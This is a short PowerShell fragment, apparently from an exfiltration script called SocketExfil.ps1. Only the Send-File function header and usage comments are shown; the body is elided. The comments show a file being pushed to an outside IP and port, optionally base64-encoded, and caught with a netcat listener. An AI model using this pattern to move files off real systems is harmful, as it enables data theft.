Function Send-File () {
        ...
        # Run . .\SocketExfil.ps1 in the directory containing the file

        # Usage (plaintext):
        # Server: Send-File -Target 10.10.10.10 -Port 9001 -Path .\test.txt
        # Client: nc -nvlp 9001 > test.txt

        # Usage (base64-encoded):
        # Server: Send-File -Target 10.10.10.10 -Port 9001 -Path .\test.txt -Encoded $true
